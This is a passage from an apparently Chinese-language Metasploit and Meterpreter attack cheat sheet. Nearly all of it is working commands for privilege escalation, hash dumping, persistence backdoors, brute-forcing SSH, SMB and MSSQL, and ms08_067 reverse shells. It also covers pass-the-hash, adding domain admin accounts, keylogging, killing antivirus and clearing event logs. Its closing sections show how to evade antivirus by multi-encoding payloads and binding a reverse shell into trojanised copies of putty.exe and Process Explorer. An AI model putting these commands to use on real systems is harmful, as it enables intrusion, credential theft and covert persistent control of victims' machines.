<p>meterpreter &gt; use incognito &#x2F;&#x2F;进入这个模块<br>meterpreter &gt; list_tokens –u &#x2F;&#x2F;查看存在的令牌<br>meterpreter &gt; impersonate_token NT AUTXXXX\SYSTEM &#x2F;&#x2F;令牌是DelegationTokens一列，getuid查看，两个斜杠</p>
<p>注：只有具有“模仿安全令牌权限”的账户才能去模仿别人的令牌，一般大多数的服务型账户（IIS、MSSQL等）有这个权限，大多数用户级的账户没有这个权限。一般从web拿到的webshell都是IIS服务器权限，是具有这个模仿权限的，建好的账户没有这个权限。使用菜刀（IIS服务器权限）反弹meterpreter是服务型权限。</p>
</blockquote>
<ol start="4">
<li>Bypassuac</li>
</ol>
<blockquote>
<p>msf &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac &#x2F;&#x2F;32位与64位一样，其他几个模块也一样<br>msf &gt; show options<br>msf &gt; set session 4<br>msf &gt; run &#x2F;&#x2F;成功后会返回一个新的session，进入新会话，发现权限没变，使用getsystem即可完成提权</p>
</blockquote>
<p>5.Hash</p>
<blockquote>
<p>meterpreter &gt; run post&#x2F;windows&#x2F;gather&#x2F;smart_hashdump &#x2F;&#x2F;读取hash这种做法最智能，效果最好。</p>
</blockquote>
<hr>
<h1 id="建立持久后门"><a href="#建立持久后门" class="headerlink" title="建立持久后门"></a>建立持久后门</h1><ol>
<li><p>服务启动后门：</p>
<blockquote>
<p>meterpreter &gt; run metsvc -A &#x2F;&#x2F;再开起一个终端，进入msfconsole<br>msf &gt; use exploit&#x2F;multi&#x2F;handler &#x2F;&#x2F;新终端中监听<br>msf &gt; set payload windows&#x2F;metsvc_bind_tcp<br>msf &gt; set LPORT 31337<br>msf &gt; set RHOST 192.168.0.128<br>msf &gt; run &#x2F;&#x2F;获取到的会话是system权限</p>
</blockquote>
</li>
<li><p>启动项启动后门</p>
<blockquote>
<p>meterpreter &gt; run persistence -X -i 10 -p 6666 -r 192.168.71.105</p>
<p>&#x2F;&#x2F; -X 系统开机自启，-i 10 10秒重连一次，-p 监听端口，-r 监听机。直接监听就好了，他自己会链接回来。<br>注意到移除 persistence 后门的办法是删除 HKLM\Software\Microsoft\Windows\CurrentVersion\Run\ 中的注册表键和 C:\WINDOWS\TEMP\ 中的 VBScript 文件。<br>缺点：容易被杀毒软件杀 。</p>
</blockquote>
</li>
</ol>
<p>这两个后门有个弊端，在进程中都会存在服务名称为meterpreter的进程。</p>
<hr>
<h1 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h1><ol>
<li><p>对端口都扫描</p>
<blockquote>
<p>use auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp<br>show options<br>set rhosts 192.168.2.1-255<br>set ports 21,22,25,443,445,1433,3306<br>set threads 20<br>exploit</p>
</blockquote>
</li>
<li><p>mssql开发利用</p>
<blockquote>
<ol>
<li>对各个ip是否有mssql服务的探测<br>use scanner&#x2F;mssql&#x2F;mssql_ping &#x2F;&#x2F;测试MSSQL的存在和信息<br>show options<br>set rhosts 192.168.2.1-255<br>set threads 30<br>exploit</li>
<li>对扫描到的ip进行爆破<br>use scanner&#x2F;mssql&#x2F;mssql_login &#x2F;&#x2F;具体配置show options。</li>
<li>sa权限对其利用<br>use admin&#x2F;mssql&#x2F;mssql_exec<br>set rhost 192.168.2.10<br>set password sa<br>set CMD cmd.exe &#x2F;c echo hello<br>exploit</li>
</ol>
</blockquote>
</li>
<li><p>mysql开放利用</p>
</li>
<li><p>爆破ssh模块：</p>
<blockquote>
<p>use auxiliary&#x2F;scanner&#x2F;ssh&#x2F;ssh_login<br>set rhosts 7.7.7.20<br>set username root<br>set pass_file &#x2F;root&#x2F;pass.txt &#x2F;&#x2F;加载字典，可以收集密码做字典<br>set threads 50<br>run</p>
</blockquote>
</li>
<li><p>通过nmap扫描基本漏洞：</p>
<blockquote>
<p>msf &gt; nmap –script&#x3D;vuln 受害靶机ip地址<br>msf &gt; nmap –script&#x3D;mysql-info 192.168.0.4 &#x2F;&#x2F;扫描mysql数据库信息 版本 等..</p>
</blockquote>
</li>
</ol>
<p>最后清除记录</p>
<blockquote>
<p>msf &gt; clearev &#x2F;&#x2F;删除目标机上的应用程序、系统和安全日志。</p>
</blockquote>
<h1 id="一些常用命令"><a href="#一些常用命令" class="headerlink" title="一些常用命令"></a>一些常用命令</h1><blockquote>
<p>查看系统命令 sysinfo</p>
<p>截图 screenshot</p>
<p>查看是否是虚拟机 run checkvm</p>
<p>查看运行木马的用户 getuid</p>
<p>注入到进程 migrate pid &#x2F;&#x2F;成功会提示successfully</p>
<p>加载mimikatz模块 meterpreter &gt; load mimikatz meterpreter &gt; wdigest &#x2F;&#x2F;需要system权限</p>
<p>获取键盘记录：meterpreter&gt; run post&#x2F;windows&#x2F;capture&#x2F;keylog_recorder #运行键盘记录模块，他自己创建本文。</p>
</blockquote>
<p><a target="_blank" rel="noopener external nofollow noreferrer" href="http://blog.csdn.net/tan6600/article/details/46850057">http://blog.csdn.net/tan6600/article/details/46850057</a></p>
<h1 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h1><p>exploit <br>测试者利用它来攻击一个系统，程序，或服务，以获得开发者意料之外的结果。常见的 <br>有内存溢出，网站程序漏洞利用，配置错误exploit。 <br>payload <br>我们想让被攻击系统执行的程序，如reverse shell 可以从目标机器与测试者之间建立一 <br>个反响连接，bind shell 绑定一个执行命令的通道至测试者的机器。payload 也可以是只 <br>能在目标机器上执行有限命令的程序。 <br>shellcode <br>是进行攻击时的一系列被当作payload 的指令，通常在目标机器上执行之后提供一个可 <br>执行命令的shell。 <br>module <br>MSF 的模块，由一系列代码组成。 <br>listener <br>等待来自被攻击机器的incoming 连接的监听在测试者机器上的程序</p>
<h1 id="编码器"><a href="#编码器" class="headerlink" title="编码器"></a>编码器</h1><p>msfencode –l 查看可用的编码器（encoders），效果最佳的是x86&#x2F;shikata_ga_nai</p>
<h1 id="信息刺探与收集"><a href="#信息刺探与收集" class="headerlink" title="信息刺探与收集"></a>信息刺探与收集</h1><h2 id="攻击第一步：基础信息收集"><a href="#攻击第一步：基础信息收集" class="headerlink" title="攻击第一步：基础信息收集"></a>攻击第一步：基础信息收集</h2><p>①whois 查询： <br>msf &gt; whois example.com <br>msf&gt; whois 192.168.1.100</p>
<p>②在线手机服务器IP工具</p>
<p>③nslookup <br>set type&#x3D;mx <br>example.com</p>
<h2 id="用nmap-探测开放端口和服务："><a href="#用nmap-探测开放端口和服务：" class="headerlink" title="用nmap 探测开放端口和服务："></a>用nmap 探测开放端口和服务：</h2><p>-sS SYN 半开扫描 <br>-sT TCP 半开扫描 <br>-Pn 不使用ping方式探测主机 <br>-A 探测服务类型 <br>-6 开启IPV6 扫描 <br>-O 探测操作系统版本</p>
<p>常用扫描参数组合： <br>nmap –sS –Pn 192.168.0.111 <br>nmap –sS –Pn –A 192.168.0.111</p>
<h2 id="MSF-与postgresql-协同工作"><a href="#MSF-与postgresql-协同工作" class="headerlink" title="MSF 与postgresql 协同工作"></a>MSF 与postgresql 协同工作</h2><p>&#x2F;etc&#x2F;init.d&#x2F;postgreql-8.3 start <br>msf&gt; db_connect postgres:<a href="mailto:&#116;&#111;&#111;&#x72;&#x40;&#x31;&#x32;&#55;&#x2e;&#48;&#x2e;&#x30;&#46;&#49;" rel="external nofollow noreferrer">&#116;&#111;&#111;&#x72;&#x40;&#x31;&#x32;&#55;&#x2e;&#48;&#x2e;&#x30;&#46;&#49;</a>&#x2F;msf <br>msf&gt; db_status <br>导入nmap 扫描的结果： <br>nmap –sS –Pn –A –oX Subnet1 192.168.1.0&#x2F;24 # -oX 扫描结果导出为Subnet1.xml <br>msf&gt; db_import Subnet1.xml <br>msf&gt; db_hosts –c address #查看导入的主机IP <br>（msf 也可以和mysql 一起工作，在bt5 r1 中msf 默认支持连接mysql： <br>msf&gt; db_driver mysql <br>msf&gt; db_connect root:<a href="mailto:&#116;&#x6f;&#x6f;&#x72;&#64;&#x31;&#50;&#55;&#46;&#48;&#x2e;&#48;&#x2e;&#x31;" rel="external nofollow noreferrer">&#116;&#x6f;&#x6f;&#x72;&#64;&#x31;&#50;&#55;&#46;&#48;&#x2e;&#48;&#x2e;&#x31;</a>&#x2F;msf3 #连接本机mysql 的msf3 数据库 <br>mysql 默认密码toor，使用db_connect 连接时会自动创建msf3 库）</p>
<h2 id="高级扫描方式："><a href="#高级扫描方式：" class="headerlink" title="高级扫描方式："></a>高级扫描方式：</h2><p>①msf&gt; use auxiliary&#x2F;scanner&#x2F;ip&#x2F;ipidseq #IPID 序列扫描器，与nmap 的-sI -O 选项类似 <br>show options <br>set RHOSTS 192.168.1.0&#x2F;24 <br>set RPORT 8080 <br>set THREADS 50 <br>run <br>（RHOSTS、RPORT 等参数也可以用小写） <br>②msf&gt; nmap –PN –sI 192.168.1.09 192.168.1.155 <br>③nmap 连接数据库： <br>msf&gt; db_connect postgres:<a href="mailto:&#x74;&#x6f;&#x6f;&#114;&#x40;&#x31;&#50;&#55;&#46;&#48;&#x2e;&#x30;&#x2e;&#x31;" rel="external nofollow noreferrer">&#x74;&#x6f;&#x6f;&#114;&#x40;&#x31;&#50;&#55;&#46;&#48;&#x2e;&#x30;&#x2e;&#x31;</a>&#x2F;msf <br>msf&gt; db_nmap –sS –A 192.168.1.111 <br>msf&gt; db_services #查看扫描结果 <br>④使用portscan 模块： <br>msf&gt; search postscan <br>msf&gt; use scanner&#x2F;postscan&#x2F;syn <br>set RHOSTS 192.168.1.111 <br>set THREADS 50 <br>run</p>
<h2 id="特定扫描："><a href="#特定扫描：" class="headerlink" title="特定扫描："></a>特定扫描：</h2><p>smb_version 模块： <br>msf&gt; use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_version <br>show options <br>set RHOSTS 192.168.1.111 <br>run <br>db_hosts –c address,os_flavor <br>查找mssql 主机： <br>msf&gt; use auxiliary&#x2F;scanner&#x2F;mssql&#x2F;mssql_ping <br>show options <br>set RHOSTS 192.168.1.0&#x2F;24 <br>set THREADS 255 <br>run <br>SSH 服务器扫描： <br>msf&gt; use auxiliary&#x2F;scanner&#x2F;ssh&#x2F;ssh_version <br>set THREADS 50 <br>run <br>FTP 主机扫描： <br>msf&gt; use auxiliary&#x2F;scanner&#x2F;ftp&#x2F;ftp_version <br>show options <br>set RHOSTS 192.168.1.0&#x2F;24 <br>set THREADS 255 <br>run <br>扫描FTP 匿名登录： <br>use auxiliary&#x2F;scanner&#x2F;ftp&#x2F;anonymos <br>set RHOSTS 192.168.1.0&#x2F;24 <br>set THREADS 50 <br>run <br>扫描SNMP 主机： <br>msf&gt; use auxiliary&#x2F;scanner&#x2F;snmp&#x2F;snmp_login <br>set RHOSTS 192.168.1.0&#x2F;24 <br>set THREADS 50 <br>run</p>
<h1 id="基本漏洞扫描"><a href="#基本漏洞扫描" class="headerlink" title="基本漏洞扫描"></a>基本漏洞扫描</h1><ol>
<li><p>使用nc 与目标端口通信，获取目标端口的信息： <br>nc 192.168.1.111 80 <br>GET HTTP 1&#x2F;1 <br>Server: Microsoft-IIS&#x2F;5.1 <br>（1：还有一个功能与nc 类似的工具Ncat，产自nmap 社区，可实现相同功能： <br>ncat -C 192.168.1.111 80 <br>GET &#x2F; HTTP&#x2F;1.0</p>
</li>
<li><p>题外：ncat 还可以做聊天服务器呢！在服务器端监听然后多个客户端直接连上就 <br>可以聊天了：服务器（chatserver）：ncatncat -l –chat 其他客户端：ncat chatserver</p>
</li>
<li><p>ncat 还可以用来查看各种客户端的请求信息，比如论坛里有人问中国菜刀有木有后门，那么可以这样查看中国菜刀连接后门时发送的数据： <br>服务器（server.example.com）上：ncat -l –keep-open 80 –output caidao.log &gt; &#x2F;dev&#x2F;null <br>然后使用菜刀连接<a target="_blank" rel="noopener external nofollow noreferrer" href="http://server.example.com/nc.php">http://server.example.com/nc.php</a> 并请求操作，这是菜刀发送的数据就保存到服务器的caidao.log 里面了。也可以导出为hex 格式，–output 换为–hex-dump就可以了。</p>
</li>
<li><p>其实与nc 功能类似的工具在bt5 里面还有很多，比如还有一个sbd： <br>监听：sbd -l -p 12345 <br>连接：sbd 192.168.1.111 12345</p>
</li>
<li><p>当然也可以用来聊天，与ncat 的不同之处在于ncat 自动对用户编号user1、user2、…， <br>而sbd 可以自定义昵称，且不需要专门单独监听为聊天服务器： <br>pc1：sbd -l -p 12345 -P chowner <br>pc2：sbd pc1 12345 -P evil</p>
</li>
<li><p>其实nc 也可以用来聊天的： <br>pc1：nc -l -p 12345 <br>pc2:telnet pc1 12345）</p>
</li>
<li><p>与nessus 结合扫描： <br>使用Nessus 扫描完成后生成.nessus 格式的报告，导入到MSF： <br>db_connect postgres:<a href="mailto:&#116;&#x6f;&#111;&#x72;&#64;&#49;&#50;&#x37;&#x2e;&#x30;&#46;&#48;&#46;&#49;" rel="external nofollow noreferrer">&#116;&#x6f;&#111;&#x72;&#64;&#49;&#50;&#x37;&#x2e;&#x30;&#46;&#48;&#46;&#49;</a>&#x2F;msf <br>db_import &#x2F;tmp&#x2F;nessus_report_Host_test.nessus <br>db_hosts –c address,svcs,vulns <br>db_vulns <br>在MSF 中使用Nessus： <br>db_connect postgres:<a href="mailto:&#x74;&#x6f;&#x6f;&#x72;&#x40;&#49;&#x32;&#55;&#x2e;&#x30;&#x2e;&#48;&#46;&#49;" rel="external nofollow noreferrer">&#x74;&#x6f;&#x6f;&#x72;&#x40;&#49;&#x32;&#55;&#x2e;&#x30;&#x2e;&#48;&#46;&#49;</a>&#x2F;msf <br>load nessus <br>nessus_connect nessus:<a href="mailto:&#116;&#x6f;&#111;&#114;&#64;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#x38;&#x2e;&#49;&#x2e;&#49;&#49;&#49;" rel="external nofollow noreferrer">&#116;&#x6f;&#111;&#114;&#64;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#x38;&#x2e;&#49;&#x2e;&#49;&#49;&#49;</a>:8834 ok <br>nessus_policy_list #查看存在的扫描规则 <br>nessus_scan_new 2 bridge_scan 192.168.1.111 #2 表示规则的ID 号，bridge_scan 自定义扫描名称 <br>nessus_scan_status #查看扫描进行状态 <br>nessus_report_list #查看扫描结果 <br>nessus_report_get skjla243-3b5d-* #导入报告 <br>db_hosts –c address,svcs,vulns</p>
</li>
<li><p>特殊扫描： <br>SMB 弱口令: <br>msf&gt; use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_login <br>set RHOSTS 192.168.1.111-222 <br>set SMBUser Administrator <br>set SMBPass admin <br>run <br>VNC 空口令： <br>msf&gt; use auxiliary&#x2F;scanner&#x2F;vnc&#x2F;vnc_none_auth <br>set RHOSTS 192.168.1.111 <br>run <br>Open X11 空口令： <br>msf&gt; use auxiliary&#x2F;scanner&#x2F;x11&#x2F;open_x11 <br>set RHOST 192.168.1.0&#x2F;24 <br>set THREADS 50 <br>run <br>当扫描到此漏洞的主机后可以使用xspy 工具来监视对方的键盘输入： <br>cd &#x2F;pentest&#x2F;sniffers&#x2F;xspy&#x2F; <br>.&#x2F;xspy –display 192.168.1.125:0 –delay 100 <br>（xspy 这货在bt5 r1 里面貌似木有了）</p>
</li>
</ol>
<h1 id="基础溢出命令"><a href="#基础溢出命令" class="headerlink" title="基础溢出命令"></a>基础溢出命令</h1><ol>
<li><p>基本命令： <br>查看可用溢出模块show exploits <br>查看辅助模块show auxiliary 包括扫描器，拒绝服务模块，fuzzer 工具或其他。 <br>查看可用选项show options <br>加载模块后退出此模块back <br>例子： <br>msf&gt; use windows&#x2F;smb&#x2F;ms08_067_netapi <br>back <br>搜索模块search <br>例子： searh mssql search ms08_067 <br>查看当前模块可用的payload： show payloads <br>例子： <br>use windows&#x2F;smb&#x2F;ms08_067_netapi <br>show payloads <br>set payload windows&#x2F;shell&#x2F;reverse_tcp <br>show options <br>**查看可选的目标类型**show targets <br>**查看更多信息**info <br>设置一个选项或取消设置set&#x2F;unset <br>设置或取消全局选项setg&#x2F;unsetg 例如设置LHOST 就可以用setg，避免后面重复设置 <br>保存全局选项的设置save 当下次启动仍然生效 <br>查看建立的session sessions –l <br>激活session sessions –i num #num 为session 编号</p>
</li>
<li><p>暴力端口探测： <br>当主机端口对外开放但是普通探测方法无法探测到时，用此模块，msf 将对目标的所有 <br>端口进行尝试，直到找到一个开放端口并与测试者建立连接。 <br>例子： <br>use exploit&#x2F;windows&#x2F;smb&#x2F;ms08_067_netapi <br>set LHOST 192.168.1.111 <br>set RHOST 192.168.1.122 <br>set TARGET 39 #Windows XP SP3 Chinese - Simplified (NX) <br>search ports #搜索与ports 相关模块 <br>set PAYLOAD windows&#x2F;meterpreter&#x2F;reverse_tcp_allports <br>exploit –j #作为后台任务运行 <br>sessions –l –v <br>sesssions –i 1</p>
</li>
<li><p>MSF 脚本文件： <br>为了缩短测试时间可以将msf 命令写入一个文件，然后在msf 中加载它。 <br>加载方式：msfconsole 的resource 命令或者msfconsole 加上-r 选项 <br>例子： <br>echo ‘version’ &gt; resource.rc <br>echo ‘load sounds’ &gt;&gt; resource.rc <br>msfconsole –r resource.rc <br>例子： <br>echo ‘use exploit&#x2F;windows&#x2F;smb&#x2F;ms08_067_netapi’ &gt; autoexp.rc <br>echo ‘set RHOST 192.168.1.133’ &gt;&gt; autoexp.rc <br>echo ‘set PAYLOAD windows&#x2F;meterpreter&#x2F;reverse_tcp’ &gt;&gt; autoexp.rc <br>echo ‘set LHOST 192.168.1.111’ &gt;&gt; autoexp.rc <br>echo ‘exploit’ &gt;&gt; autoexp.rc <br>msfconsole <br>msf&gt; resource autoexp.rc</p>
</li>
</ol>
<h1 id="METERPRETER"><a href="#METERPRETER" class="headerlink" title="METERPRETER"></a>METERPRETER</h1><ol>
<li><p>当对目标系统进行溢出时，使用meterpreter 作为payload，给测试者返回一个shell，可用于在目标机器上执行更多的操作。 <br>例子： <br>msf&gt; nmap –sT –A –P0 192.168.1.130 #探测开放服务 <br>假如已经探测到1433（TCP）和1434(UDP)端口（mssql）， <br>msf&gt; nmap –sU 192.168.1.130 –P 1434 #确认端口开放 <br>msf&gt; use auxiliary&#x2F;scanner&#x2F;mssql&#x2F;mssql_ping <br>show options <br>set RHOSTS 192.168.1.1&#x2F;24 <br>set THREADS 20 <br>exploit <br>至此可获取服务器名称，版本号等信息。 <br>msf&gt; use auxiliary&#x2F;scanner&#x2F;mssql&#x2F;mssql_login <br>show options <br>set PASS_FILE &#x2F;pentest&#x2F;exploits&#x2F;fasttrack&#x2F;bin&#x2F;dict&#x2F;wordlist.txt <br>set RHOSTS 192.168.1.130 <br>set THREADS 10 <br>set verbose false <br>exploit <br>暴力猜解登陆密码。接下来使用mssql 自带的xp_cmdshell 功能添加账户： <br>msf&gt; use exploit&#x2F;windows&#x2F;mssql&#x2F;mssql_payload <br>show options <br>set payload windows&#x2F;meterpreter&#x2F;reverse_tcp <br>set LHOST 192.168.1.111 <br>set LPORT 433 <br>set RHOST 192.168.1.130 <br>set PASSWORD password130 <br>exploit <br>当获取到一个meterpreter shell 后可以执行更多的操作： <br>获取屏幕截图：screenshot <br>获取系统信息：sysinfo <br>获取键盘记录： <br>meterpreter&gt; ps #查看目标机器进程，假设发现explorer.exe 的进程号为1668: <br>meterpreter&gt; migrate 1668 #插入该进程 <br>meterpreter&gt; run post&#x2F;windows&#x2F;capture&#x2F;keylog_recorder #运行键盘记录模块，将击键记录保存到本地txt <br>cat &#x2F;root&#x2F;.msf3&#x2F;loot&#x2F;*.txt #查看结果 <br>获取系统账号密码： <br>meterpreter&gt; use priv <br>meterpreter&gt; run post&#x2F;windows&#x2F;gather&#x2F;hashdump <br>当获取到密码的hash 之后无法破解出明文密码且无法直接使用hash 登陆，需要使用 <br>pass-the-hash 技术： <br>msf&gt; use windows&#x2F;smb&#x2F;psexec <br>set PAYLOAD windows&#x2F;meterpreter&#x2F;reverse_tcp <br>set LHOST 192.168.1.111 <br>set LPORT 443 <br>set RHOST 192.168.1.130 <br>set SMBPass aad3b435b51404eeaad3b435b51404ee:b75989f65d1e04af7625ed712ac36c29 <br>exploit <br>获取到系统权限后我们可以新建一个普通账号，然后使用此账号执行我们的后门： <br>在目标机器上执行：net uaer hacker pass &#x2F;add <br>本地生成一个后门程序： <br>msfpayload windows&#x2F;meterpreter&#x2F;reverse_tcp <br>LHOST&#x3D;192.168.1.111 LPORT&#x3D;443 X &gt;payload.exe <br>将payload.exe 拷贝到目标机器然后使用新建立的账号执行本地执行端口监听，等待来自目标机器连接： <br>msfcli multi&#x2F;handler PAYLOAD&#x3D;windows&#x2F;meterpreter&#x2F;reverse_tcp <br>LHOST&#x3D;192.168.1.111 LPORT&#x3D;443 <br>use priv <br>getsystem <br>getuid <br>至此取得SYSTEM 权限</p>
</li>
<li><p>令牌模拟：当有域控账户登陆至服务器时可使用令牌模拟进行渗透取得域控权限，之后登陆其他机器时不需要登陆密码。 <br>meterpreter&gt; ps # 查看目标机器进程，找出域控账户运行的进程ID，假如发现PID 为380 <br>meterpreter&gt; steal_token 380 <br>有时ps 命令列出的进程中可能不存在域控账户的进程，此时使用incognito 模块查看可 <br>用token： <br>meterpreter&gt; use incognito <br>meterpreter&gt; list_tokens –u #列出可用token，假如找到域控token <br>meterpreter&gt; impersonate_token SNEAKS.IN\ihazdomainadmin <br>meterpreter&gt; add_user hacker password –h 192.168.1.50 #在域控主机上添加账户 <br>meterpreter&gt; add_group_user “Domain Admins” hacker –h 192.168.1.50 #将账户添加至域管理员组</p>
</li>
<li><p>内网渗透：当取得同网段内一台主机的权限后可以进一步渗透网内其他主机： <br>例子： <br>meterpreter&gt; run get_local_subnets #查看网段&#x2F;子网 <br>Local subnet: 192.168.33.0&#x2F;255.255.255.0 <br>meterpreter&gt; background #转入后台运行 <br>msf&gt; route add 192.168.33.0 255.255.255.0 1 #本地添加路由信息 <br>msf&gt; route print #查看添加的信息 <br>msf&gt; use linux&#x2F;samba&#x2F;lsa_transnames_heap #准备向内网目标主机进攻 <br>set payload linux&#x2F;x86&#x2F;shell&#x2F;reverse_tcp <br>set LHOST 10.10.1.129 #此处为attacking 主机的外网IP <br>set LPORT 8080 <br>set RHOST 192.168.33.132 #内网目标主机 <br>exploit <br>也可以使用自动式添加路由模块： <br>msf&gt; load auto_add_route <br>msf&gt; exploit</p>
</li>
<li><p>Meterpreter 脚本： <br>使用run scriptname 方式执行 <br>①vnc 脚本,获取远程机器vnc 界面控制 <br>meterpreter&gt; run vnc <br>meterpreter&gt; run screen_unlock <br>②进程迁移 <br>当攻击成功后将连接进程从不稳定进程（如使用浏览器溢出漏洞exp 进行攻击时浏览器可能会被目标关闭）迁移至稳定进程(explorer.exe)，保持可连接。 <br>例子： <br>meterpreter&gt; run post&#x2F;windows&#x2F;manage&#x2F;migrate <br>（在64 位win7 中migrate 需要管理员权限执行后门才能成功，而migrate 前后获取的 <br>权限是有差异的。） <br>③关闭杀毒软件 <br>meterpreter&gt; run killav （这个脚本要小心使用，可能导致目标机器蓝屏死机。） <br>④获取系统密码hash <br>meterpreter&gt; run hashdump <br>（64 位win7 下需要管理员权限执行后门且先getsystem，然后使用 <br>run post&#x2F;windows&#x2F;gather&#x2F;hashdump 来dump hash 成功率更高。 <br>而且如果要使用shell 添加系统账户的话win7 下得先： <br>run post&#x2F;windows&#x2F;escalate&#x2F;bypassuac ，不然可能不会成功。） <br>⑤获取系统流量数据 <br>meterpreter&gt; run packtrecorder –i 1 <br>⑥直捣黄龙 <br>可以干很多事情：获取密码，下载注册表，获取系统信息等 <br>meterpreter&gt; run scraper <br>⑦持久保持 <br>当目标机器重启之后仍然可以控制 <br>meterpreter&gt; run persistence –X –i 50 –p 443 –r 192.168.1.111 <br>-X 开机启动-i 连接超时时间–p 端口–rIP <br>下次连接时： <br>msf&gt; use multi&#x2F;handler <br>set payload windows&#x2F;meterpreter&#x2F;reverse_tcp <br>set LPOST 443 <br>set LHOST 192.168.1.111 <br>exploit <br>(会在以下位置和注册表以随机文件名写入文件等信息，如： <br>C:\Users\YourtUserName\AppData\Local\Temp\MXIxVNCy.vbs <br>C:\Users\YourtUserName\AppData\Local\Temp\radF871B.tmp\svchost.exe <br>HKLM\Software\Microsoft\Windows\CurrentVersion\Run\DjMzwzCDaoIcgNP) <br>⑧POST 整合模块 <br>可实现同时多个session 操作 <br>例子：获取hash <br>meterpreter&gt; run post&#x2F;windows&#x2F;gather&#x2F;hashdump <br>其他还有很多，使用TAB 键补全看下就知道run post&#x2F;</p>
</li>
<li><p>升级command shell <br>例子： <br>msfconsole <br>msf&gt; search ms08_067 <br>msf&gt; use windows&#x2F;smb&#x2F;ms08_067_netapi <br>set PAYLOAD windows&#x2F;shell&#x2F;reverse_tcp <br>set TARGET 3 <br>setg LHOST 192.168.1.111 <br>setg LPORT 8080 <br>exploit –z #后台运行，如果此处未使用-z 参数，后面可以按CTRL-Z 转到后台 <br>sessions –u 1 #升级shell，必须前面使用setg 设定 <br>sessions –i 2</p>
</li>
<li><p>使用Railgun 操作windows APIs <br>例子： <br>meterpreter&gt; irb</p>
</li>
</ol>
<blockquote>
<blockquote>
<p>client.railgun.user32.MessageBoxA(o,”hello”,”world”,”MB_OK”) <br>在目标机器上会弹出一个标题栏为world 和内容为hello 的窗口</p>
</blockquote>
</blockquote>
<h1 id="避开杀软"><a href="#避开杀软" class="headerlink" title="避开杀软"></a>避开杀软</h1><ol>
<li><p>使用msfpayload 创建可执行后门： <br>例子： <br>msfpayload windows&#x2F;shell_reverse_tcp 0 #查看选项 <br>msfpayload windows&#x2F;shell_reverse_tcp LHOST&#x3D;192.168.1.111 LPORT&#x3D;31337 X &gt; <br>&#x2F;var&#x2F;www&#x2F;payload1.exe <br>然后本机监听端口 <br>msf&gt; use exploit&#x2F;multi&#x2F;handler <br>show options <br>set PAYLOAD windows&#x2F;shell_reverse_tcp <br>set LHOST 192.168.1.111 <br>set LPORT 31337 <br>exploit</p>
</li>
<li><p>过杀软—使用msfencode 编码后门： <br>msfencode –l #列出可用编码器 <br>例子： <br>msfpayload windows&#x2F;shell_reverse_tcp LHOST&#x3D;192.168.1.111 LPORT&#x3D;31337 R <br>|msfencode –e x86&#x2F;shikata_ga_nai –t exe &gt; &#x2F;var&#x2F;www&#x2F;payload2.exe <br>使用R 参数作为raw 输出至管道，再经过msfencode 处理，最后导出。</p>
</li>
<li><p>多次编码： <br>例子： <br>msfpayload windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.1.111 LPORT&#x3D;31337 R | <br>msfencode –e x86&#x2F;shikata_ga_nai –c 5 –t raw | msfencode –e x86&#x2F;alpha_upper –c 2 –t raw | <br>msfencode –e x86&#x2F;shikata_ga_nai –c 5 –t raw | msfencode –e x86&#x2F;countdown –c 5 –t exe –o <br>&#x2F;var&#x2F;www&#x2F;payload3.exe <br>简单编码被杀机会很大，使用多次编码效果更好，这里一共使用了17 次循环编码。 <br>（题外：经测试，1：使用此命令生成的后门也被MSE 杀到；2：未编码的后门或编码次数较少的后门可以直接被秒杀；3：windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp 生成的后门未经任何处理仍然不被杀，看来杀毒软件傻逼了；4：x86 编码器编码的后门在64 位机器上无法执行；5：360 有个沙箱功能，后门文件右键选择“在360 隔离沙箱中运行”，msf照样可以连接并操作，看来隔离沙箱功能有限。）</p>
</li>
<li><p>自定义可执行程序模板： <br>msfencode 默认使用data&#x2F;templates&#x2F;templates.exe（msf v4 在templates 目录下有针对不同 <br>平台的不同模板）作为可执行程序的模板，杀毒厂商也不是傻逼，所以这里最好使用自定义模板，如： <br>wget <a target="_blank" rel="noopener external nofollow noreferrer" href="http://download.sysinternals.com/Files/ProcessExplorer.zip">http://download.sysinternals.com/Files/ProcessExplorer.zip</a> <br>cd work <br>unzip ProcessExplorer.zip <br>cd .. <br>msfpayload windows&#x2F;shell_reverse_tcp LHOST&#x3D;192.168.1.111 LPORT&#x3D;8080 R | msfencode <br>–t exe –x work&#x2F;procexp.exe –o &#x2F;var&#x2F;www&#x2F;pe_backdoor.exe –e x86&#x2F;shikata_ga_nai –c 5 <br>在目标机器上运行，然后本地使用msfcli 监听端口等待反弹连接： <br>msfcli exploit&#x2F;multi&#x2F;handler PAYLOAD&#x3D;windows&#x2F;shell_reverse_tcp LHOST&#x3D;192.168.1.111 <br>LPORT&#x3D;8080 E</p>
</li>
<li><p>暗度陈仓—猥琐执行payload： <br>绑定payload 至一个可执行文件，让目标不知不觉间中招，以putty.exe 为例： <br>msfpayload windows&#x2F;shell_reverse_tcp LHOST&#x3D;192.168.1.111 LPORT&#x3D;8080 R | msfencode <br>–t exe –x putty.exe -o &#x2F;var&#x2F;www&#x2F;putty_backdoor.exe –e x86&#x2F;shikata_ga_nai –k –c 5 <br>假如选择一个GUI 界面的程序作为绑定目标并且不使用-k 选项，则目标执行此程序的时候不会弹出cmd 窗口，-k 选项的作用是payload 独立于模板软件的进程运行。</p>
</li>
<li><p>加壳： <br>msfencode 部分编码器会增加程序体积，这时可使用壳（packer）来压缩程序，“带套之后更保险”，例如UPX ： <br>apt-get install upx <br>最新版可到sf.net 下载 <br>使用方法： <br>upx -5 &#x2F;var&#x2F;www&#x2F;payload3.exe <br>还有另外一个工具msfvenom 结合了msfpayload 和msfencode 的功能，使用起来更省心， <br>亲，一定要试试哦！过杀软总结起来就是多次编码和使用多种壳，终极大法就是使用自己编写的后门（市面上没有，被杀几率更低）。</p>
</li>
</ol>
<h1 id="使用用户端攻击方式-client-side-attacks"><a href="#使用用户端攻击方式-client-side-attacks" class="headerlink" title="使用用户端攻击方式(client-side attacks)"></a>使用用户端攻击方式(client-side attacks)</h1><ol>
